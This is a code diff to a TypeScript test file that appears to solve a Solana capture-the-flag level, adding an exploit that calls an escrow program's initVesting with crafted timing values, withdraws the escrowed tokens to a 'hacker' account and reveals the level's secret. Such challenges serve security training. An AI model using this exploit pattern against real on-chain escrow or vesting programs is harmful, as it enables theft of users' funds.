@@ -3,7 +3,7 @@ import * as web3 from "@solana/web3.js";
 import { Level4 } from "../target/types/level_4";
 import * as path from 'path';
 import * as fs from 'fs';
-import { TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";
+import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, createAssociatedTokenAccount, getAssociatedTokenAddressSync, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";
 
 
 const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
@@ -40,6 +40,7 @@ describe("level-4", async () => {
   const program = anchor.workspace.Level4 as anchor.Program<Level4>;
 
   let escrowPdaAuthority: any;
+  let HACKER_ATA: any
 
 
   before("Setup", async () => {
@@ -47,6 +48,20 @@ describe("level-4", async () => {
 
     [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);
 
+    const hackerAta = await getOrCreateAssociatedTokenAccount(
+      provider.connection,
+      hacker,
+      USDC,
+      hacker.publicKey,
+      false,
+      'confirmed',
+      null,
+      TOKEN_2022_PROGRAM_ID,
+      ASSOCIATED_TOKEN_PROGRAM_ID
+      )
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    console.log(`Hacker ATA -> ${hackerAta.address}`)
+    HACKER_ATA = hackerAta
 
   });
 
@@ -59,10 +74,16 @@ describe("level-4", async () => {
 
   it("Exploit", async () => {
 
-    const hack = await program.methods.initVesting(recipient.publicKey, new anchor.BN ('1000'), new anchor.BN ('0'), new anchor.BN ('1'), new anchor.BN ('1'))
+    const hack = await program.methods.initVesting(
+      recipient.publicKey, //recipient
+      new anchor.BN ('1000'), //amount
+      new anchor.BN ('0'), //start_at
+      new anchor.BN ('1'), //end_at
+      new anchor.BN ('1') //interval
+    )
     .accounts({
       sender: hacker.publicKey,
-      senderTokenAccount: HACKER_TOKEN_ACCOUNT,
+      senderTokenAccount: HACKER_ATA,
       escrow: ESCROW,
       escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
       mint: USDC,
@@ -72,9 +93,50 @@ describe("level-4", async () => {
     .signers([hacker])
     .rpc();
 
-    
+  });
+
+  it("Inspect escrow", async () => {  
+    const escrow = await program.account.escrow.fetch(ESCROW);
+    console.log(escrow);
+  });
+
+  it ("Withdraw", async () => {
+    const withdraw = await program.methods.withdrawUnlocked()
+    .accounts({
+      recipient: hacker.publicKey,
+      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
+      escrow: ESCROW,
+      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
+      escrowPdaAuthority: escrowPdaAuthority,
+      mint: USDC,
+      tokenProgram: TOKEN_2022_PROGRAM_ID,
+      systemProgram: web3.SystemProgram.programId
+    })
+    .signers([hacker])
+    .rpc()
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    console.log(withdraw);
+
+  })
+
+
+
+  it("Reveals secrets", async () => {
+
+    const reveal = await program.methods.revealSecret(SECRET)
+    .accounts({
+      hacker: hacker.publicKey,
+      hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
+      mint: USDC
+    }
+    )
+    .signers([hacker])
+    .rpc();
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    console.log(reveal);
 
   });
+
 
   // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
   // | | | | | | | | | | | | | | | | | | | | |
@@ -83,17 +145,20 @@ describe("level-4", async () => {
   // x x x x x x x x x x x x x x x x x x x x x
 
 
-  it("Bug evaluation", async () => {
+  // it("Bug evaluation", async () => {
 
 
-    await program.methods.revealSecret(SECRET).accounts({
-      hacker: hacker.publicKey,
-      hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
-      mint: USDC
-    }
-    ).signers([hacker]).rpc({ commitment: "confirmed" });
+  //   await program.methods.revealSecret(SECRET)
+  //   .accounts({
+  //     hacker: hacker.publicKey,
+  //     hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
+  //     mint: USDC
+  //   }
+  //   )
+  //   .signers([hacker])
+  //   .rpc({ commitment: "confirmed" });
 
-  });
+  // });
 
 });
 
